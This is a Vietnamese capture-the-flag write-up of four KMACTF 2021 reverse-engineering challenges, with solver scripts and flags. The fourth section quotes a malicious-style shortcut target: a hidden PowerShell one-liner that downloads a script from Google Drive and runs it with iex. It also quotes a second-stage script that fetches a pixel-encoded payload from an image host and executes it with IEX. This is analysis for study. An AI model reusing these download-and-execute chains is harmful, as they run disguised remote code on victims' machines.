# 1. recursion

![recursion](/2021_KMACTF/images/h0.PNG "recursion")

Đầu tiên tôi thấy trong phần string có một const đặc biệt.

![recursion](/2021_KMACTF/images/h1.PNG "recursion")

Xref theo string này, nó sẽ dẫn tới hàm `sub_4014DD()`.

![recursion](/2021_KMACTF/images/h2.PNG "recursion")

Ở đây, ta thấy `dword_404020` sẽ là mảng chứa các giá trị để phục vụ việc tính toán, và làm tham số cho hàm `sub_401460()`. Kết quả trả về của hàm `sub_401460()` đó chính là flag và sẽ được in ra console.

![recursion](/2021_KMACTF/images/h3.PNG "recursion")

Phân tích vào hàm `sub_401460()`, ta thấy nó sử dụng đệ quy để tính toán. Hạn chế của đê quy là nếu số truyền vào càng lớn thì tốc độ tính toán càng chậm. Nên khi tôi chạy file thì không nhận được flag. :((

Để giải quyết được bài toán này thì chúng ta sẽ khử đệ quy bằng cách tìm quy luật của nó.

Hàm này quy luật sẽ như sau:

          a[0] = 0
          a[1] = 1
          a[2] = 2
          a[3] = (75 * a[2]) + (3 * a[1]) + (17 * a[0])
          a[4] = (75 * a[3]) + (3 * a[2]) + (17 * a[1])

Từ đó ta có được script như bên dưới:

```python
enc = [7, 9, 19, 5, 262, 182, 33, 112, 134, 12, 136, 55, 309, 33, 239, 84, 405, 55, 121, 84, 215, 33, 134, 12, 239, 33, 23, 239, 23, 379, 309, 37, 41]
flag = ""
for i_enc in range(len(enc)):
	data = [0 for i in range(enc[i_enc] + 1)]
	for i in range(0, enc[i_enc] + 1):
		if i == 0:
			data[0] = 0
		elif i == 1:
			data[1] = 1
		elif i == 2:
			data[2] = 2
		else:
			data[i] = (75 * data[i - 1]) + (3 * data[i - 2]) + (17 * data[i - 3])
	flag += chr(data[enc[i_enc]] & 0xFF)

print(flag)
```

Flag là: `KMA{pH180n4Cc1_r3CurS10n_1s_sUck}`



# 2. Encryptor

![Encryptor](/2021_KMACTF/images/h4.PNG "Encryptor")

Đây là một chương trình mã hóa file. Load vào IDA để phân tích.

![Encryptor](/2021_KMACTF/images/h5.PNG "Encryptor")

Hàm `main()` chương trình gồm 3 hàm:
* `f_open_file()` sẽ thực hiện mở, đọc file và lưu data vào memory, địa chỉ của memory này sẽ lưu vào biến **argc**
* `f_encrypt_file()` mã hóa data
* `f_save_encrypted_file()` lưu encrypted data vào file với đường dẫn là file gốc + ".encrypt" extension.
    
![Encryptor](/2021_KMACTF/images/h6.PNG "Encryptor")

Tôi tiến hành phân tích sâu vào `f_encrypt_file()`. Tôi thấy mỗi lần mã hóa 8 bytes. Cuối cùng data mã hóa đó sẽ được lưu lại vào biến `data` bằng hàm `memmove()`.

Từ đây tôi sẽ viết script để decrypt lại file bằng **z3** python.

```python
from z3 import *

with open("flag.jpg.encrypt", "rb") as f:
	enc = f.read()

data = [0 for i in range(len(enc))]

for i_len_enc in range(0, len(enc) - 1, 8):

	inp = [BitVec("%d" % i, 8) for i in range(8)]
	s = Solver()
	rs = 0

	for i in range(0, 8):
		rs = 0
		for j in range(0, 8):
			rs += ((inp[j] >> i) & 1) << j
		rs = 0xFF - (rs & 0xFF) + 1

		s.add(rs == enc[i_len_enc + i])

	if s.check() == sat:
		flag = []
		m = s.model()
		md = sorted([(d, m[d]) for d in m], key = lambda x: str(x[0]))
		for i in md:
			flag.append(i[1].as_long())
		for i in range(0, 8):
			data[i_len_enc + i] = flag[i]

with open("flag.jpg", "wb") as f:
	f.write(bytearray(data))

print("Done!")
```

Flag là: `KMA{Encryp7_w17H0u7_x0r}`



# 3. Amazing Good Mood

![Amazing](/2021_KMACTF/images/h7.PNG "Amazing")

Theo như dạng đề này, tôi mạnh dạng đoán là flag đã được giấu vào các pixel của ảnh :))

![Amazing](/2021_KMACTF/images/h8.PNG "Amazing")

Load file vào **CFF Explore** thì tôi nhận ra file được viết bằng **C#**.

Load file vào **dnSpy** để phân tích.

![Amazing](/2021_KMACTF/images/h9.PNG "Amazing")

Tại hàm `main()`, ta thấy chương trình yêu cầu 3 tham số: Đường dẫn file bitmap gốc, đường dẫn file chứa secret cần giấu vào ảnh, đường dẫn file bitmap sẽ được lưu.

Ta chú ý tại dòng 172 và 173, sẽ dùng để lấy các bytes secret và kiểm tra chiều dài secret phải bằng 24.

![Amazing](/2021_KMACTF/images/h10.PNG "Amazing")

Hàm `Program.h()` sẽ làm nhiệm vụ mã hóa secret, tôi nhận ra đây là mã hóa **RC4**.

Key sẽ được decode **base64** của biến `Program.yy`. 

Đặc biệt chú ý, **nhấn chuột phải -> Analyze**, ta sẽ thấy biến này còn được sử dụng tại hàm `Program.Init()`.

![Amazing](/2021_KMACTF/images/h11.PNG "Amazing")

Hàm này được gọi ở đầu hàm `main()`, nó thực hiện kiểm tra debug bằng hàm `IsDebuggerPresent()`. Nếu đúng thì sẽ ghép thêm chuỗi `QDIwMjI=` vào biến `Program.yy`, ngược lại thì ghép thêm chuỗi `QDEyMzQ=`.

Từ đây ta có thể decode base64 chuỗi `S01BQ1RGQDEyMzQ=` sẽ được key là `KMACTF@1234`.

![Amazing](/2021_KMACTF/images/h12.PNG "Amazing")

Sau khi mã hóa secret. Hàm `Program.j()` sẽ được gọi để giấu encrypted secret theo quy tắc như sau:
* **red**: sẽ giữ 3 bit tính từ bit thấp nhất
* **green**: sẽ giữ 3 bit tiếp theo
* **blue**: sẽ giữ 3 bit còn lại
      
Từ những gì tôi phân tích, tôi sẽ viết một đoạn C# để dump các pixel từ file `encrypted.bmp` sau đó phục hồi lại encrypted secret. Cuối cùng sẽ decrypt bằng **RC4**.

```C#
static void Main(string[] args)
{
      Bitmap image1 = new Bitmap("C:\\Users\\ChiThanh\\Desktop\\kmactf\\re\\encrypted.bmp");
      int x, y;
      int z = 0;

      for (x = 0; x < image1.Width; x++)
      {
             for (y = 0; y < image1.Height; y++)
             {   
                   if (z >= 24) {
                         System.Environment.Exit(0);
                   }
                   z += 1;
                   Color pixelColor = image1.GetPixel(x, y);
                   int result = (pixelColor.R << 6) + (pixelColor.G << 3) + pixelColor.B;
                   Console.Write(result.ToString("X2"));
             }
      }
}
```

Flag là `KMA{d0nT_tRu$t_m3_hihi!}`



# 4. ps

![ps](/2021_KMACTF/images/h13.PNG "ps")

Nhìn vào file `ps` thì tôi xác định đây là một shortcut. Thường một số malware cũng hay sử dụng cách này để download payload về. Vì vậy tôi sẽ vào Property để kiểm tra target của nó.

```Powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c "(New-Object Net.WebClient).DownloadString('https://drive.google.com/u/0/uc?id=1rzjAbtVnylBuOL4hSdp60fGZ24Od7DCV&export=download') | iex"
```

Chúng ta thấy shortcut này dùng script của Powershell để download file về thực thi. Tôi sẽ download file về để phân tích.

```Powershell
sal a New-Object;
Add-Type -A System.Drawing;
$g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/FmsX0Bx/payload.png"));
$o = a Byte[] 2221;
(0..0) | % {
   foreach ($x in (0..2220)) {
     $p = $g.GetPixel($x, $_);
     $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
   }
};
IEX([System.Text.Encoding]::ASCII.GetString($o[0..1417]))
```

File download về cũng là một Powershell script, script này thực hiện việc download payload về, sau đó giải mã payload đó. Cuối cùng sẽ thực thi payload đó.

Để có thể tiếp tục phân tích, tôi đã sửa lại script như bên dưới, sau đó upload lên drive, sửa lại link trong target của shortcut và thực thi lại `ps` shortcut.

```Powershell
sal a New-Object;
Add-Type -A System.Drawing;
$g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/FmsX0Bx/payload.png"));
$o = a Byte[] 2221;
(0..0) | % {
   foreach ($x in (0..2220)) {
     $p = $g.GetPixel($x, $_);
     $o[$_ * 2221 + $x] = ([math]::Floor(($p.B -band 15) *  16) -bor ($p.G -band 15))
   }
};
[System.Text.Encoding]::ASCII.GetString($o[0..1417]) | Out-File -FilePath .\Payload.txt
```

Sau khi thực thi, ta có được file `Payload.txt`.

```Powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFI9eyRELCRLPSRBcmdzOyRTPTAuLjI1NTswLi4yNTV8JXskSj0oJEorJFNbJF9dKyRLWyRfJSRLLkxlbmd0aF0pJTI1NjskU1skX10sJFNbJEpdPSRTWyRKXSwkU1skX119OyREfCV7JEk9KCRJKzEpJTI1NjskSD0oJEgrJFNbJEldKSUyNTY7JFNbJEldLCRTWyRIXT0kU1skSF0sJFNbJEldOyRfLWJ4b3IkU1soJFNbJEldKyRTWyRIXSklMjU2XX19O1t2b2lkXVtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiTWljcm9zb2Z0LlZpc3VhbEJhc2ljIik7JEluID0gKFtzeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgpLkdldEJ5dGVzKFtNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpJbnB1dEJveCggIkVudGVyIGZsYWc6IiwiU2ltcGxlIENyYWNrbWUiKSk7W2J5dGVbXV0gJEsgPSAxMTksNzIsMTIxLDk1LDg5LDQ4LDExNyw5NSw5OCw4NSw0OSw0OSw4OSw5NSwxMDksNTE7W2J5dGVbXV0gJEQgPSA0OSw2Nyw1Nyw0OSw2NSw0OSw1Niw2Niw2Nyw2OCw0OCw1NSw1Niw1Miw3MCw1Myw1NCw1NSw1Niw2NSw1MCw1Nyw2OCw1NSw1MSw1NCw1Miw1MCw3MCw1Nyw2Niw1NSw2OCw2Nyw1Nyw1Nyw3MCw1NCw2NSw1MSw1Miw1NCw2Niw1Miw2OSw2OCw1MSw2Niw1MCw0OCw0OCw1Nyw2OCw2NSw1MSw2OCw1NSw1NSw2Nyw0OSw1NSw1MCw1NCw2Nyw1Niw2NTskViA9ICgmICRSICRJbiAkS3wgRm9yRWFjaC1PYmplY3QgeyAiezA6WDJ9IiAtZiAkXyB9KSAtam9pbiAnJztpZihbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJEQpIC1lcSAkVil7W01pY3Jvc29mdC5WaXN1YWxCYXNpYy5JbnRlcmFjdGlvbl06Ok1zZ0JveCgiQ29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEluZm9ybWF0aW9uIiwgIlN1Y2Nlc3MiKX1lbHNle1tNaWNyb3NvZnQuVmlzdWFsQmFzaWMuSW50ZXJhY3Rpb25dOjpNc2dCb3goIkluY29ycmVjdCEiLCAiT2tPbmx5LFN5c3RlbU1vZGFsLEV4Y2xhbWF0aW9uIiwgIkVycm9yIil9")) | iex
```

Decode base64, ta được đoạn script như bên dưới:

```Powershell
$R={       # RC4 function
	$D, $K = $Args;
	$S = 0..255;
	0..255 | %   # KSA
	{
		$J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;
		$S[$_], $S[$J] = $S[$J], $S[$_]           # swap
	};
	$D | %     # PRGA
	{ 
		$I = ($I + 1) % 256;
		$H = ($H + $S[$I]) % 256;
		$S[$I], $S[$H] = $S[$H], $S[$I];
		$_ -bxor $S[($S[$I] + $S[$H]) % 256]
	}
};

[void][Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic");

$In = ([system.Text.Encoding]::UTF8).GetBytes([Microsoft.VisualBasic.Interaction]::InputBox( "Enter flag:","Simple Crackme"));

[byte[]] $K = 119,72,121,95,89,48,117,95,98,85,49,49,89,95,109,51;
[byte[]] $D = 49,67,57,49,65,49,56,66,67,68,48,55,56,52,70,53,54,55,56,65,50,57,68,55,51,54,52,50,70,57,66,55,68,67,57,57,70,54,65,51,52,54,66,52,69,68,51,66,50,48,48,57,68,65,51,68,55,55,67,49,55,50,54,67,56,65;

$V = (& $R $In $K| ForEach-Object { "{0:X2}" -f $_ }) -join '';

if([System.Text.Encoding]::ASCII.GetString($D) -eq $V){
	[Microsoft.VisualBasic.Interaction]::MsgBox("Correct!", "OkOnly,SystemModal,Information", "Success")
}
else{
	[Microsoft.VisualBasic.Interaction]::MsgBox("Incorrect!", "OkOnly,SystemModal,Exclamation", "Error")
}
```

Cách hoạt động của script sẽ như sau:
* Biến ``$In`` sẽ chứa chuỗi flag nhập vào
* `InputBox( "Enter flag:","Simple Crackme"));` sẽ mở một box để người dùng nhập flag
* Biến `$K` sẽ là mảng key để mã hóa flag
* Biến `$D` sẽ là mảng flag đã bị mã hóa
* `$V = (& $R $In $K| ForEach-Object { "{0:X2}" -f $_ }) -join '';` thực hiện việc gọi hàm `$R` với tham số là `$In` và `$K`. Kết quả trả về của hàm sẽ được chuyển sang chuỗi các kí tự hexa và lưu vào biến `$V`
* `[System.Text.Encoding]::ASCII.GetString($D) -eq $V` dùng để so sánh biến `$D` và `$V`
* Hàm `$R` là hàm mã hóa **RC4**, với `$D` là flag và `$K` là key

Tới đây, tôi có thể decrypt **RC4** với `key=7748795f5930755f62553131595f6d33`, `enc=1C91A18BCD0784F5678A29D73642F9B7DC99F6A346B4ED3B2009DA3D77C1726C8A`.


Flag là: `KMA{----->fiL3L355_mALwar3<-----}`




























